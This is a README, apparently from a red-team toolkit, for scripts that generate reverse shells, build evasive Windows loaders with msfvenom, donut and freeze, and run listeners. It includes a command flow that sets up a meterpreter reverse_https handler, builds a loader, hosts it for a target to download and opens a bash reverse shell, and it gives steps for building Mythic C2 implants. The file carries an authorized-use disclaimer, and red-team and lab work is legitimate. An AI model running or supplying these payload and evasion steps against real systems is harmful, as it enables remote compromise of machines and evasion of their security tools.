# scripts/payloads — payloads, evasion & shells

Generate callbacks and implants, catch them, and (for Windows) add evasion by
chaining the installed kit (msfvenom, donut, freeze, pwncat, msfconsole).

> **Authorized red-team / lab / hackathon use only.** Output are live payloads —
> store them carefully and only deploy against in-scope systems.

## Scripts
- **shellgen.sh** — prints reverse shells in every common language
  (bash/nc/python/perl/php/ruby/powershell) for a given LHOST/LPORT, plus
  base64 + URL-encoded variants and a PowerShell download-cradle. `-L` also
  starts a matching listener.
- **payload-forge.sh** — guided `msfvenom → donut → freeze` build. Prints each
  command before running and saves all artifacts to one dir. Stop at any stage;
  bring your own raw shellcode with `-r`.
- **listener.sh** — one command for a catcher: raw (`pwncat-cs`/`rlwrap nc`/`nc`),
  a Metasploit `multi/handler` (`-m`), or a quick HTTP server to host payloads (`-w`).

## Typical flow
```
hk-listener -m -P windows/x64/meterpreter/reverse_https -l 10.10.14.3 -p 443 &
hk-payload-forge -l 10.10.14.3 -p 443        # -> loader.exe (msfvenom->donut->freeze)
hk-listener -w -D .                          # host loader.exe for the target to pull
# or, for a quick interactive *nix shell:
hk-shellgen -l 10.10.14.3 -p 9001 -t bash -L
```

## Mythic C2 payloads
Mythic builds payloads through its web UI/API, not a CLI script:
1. Browse `https://127.0.0.1:7443` (admin creds in `Mythic/.env`).
2. Install an agent + C2 profile once, e.g. on the VM:
   `cd /opt/tools/c2/Mythic && sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo`
   and a profile from `https://github.com/MythicC2Profiles` (e.g. `http`).
3. Create Payloads → pick agent/profile → build → download. Use `donut`/`freeze`
   above on the raw output if you need extra evasion.
```
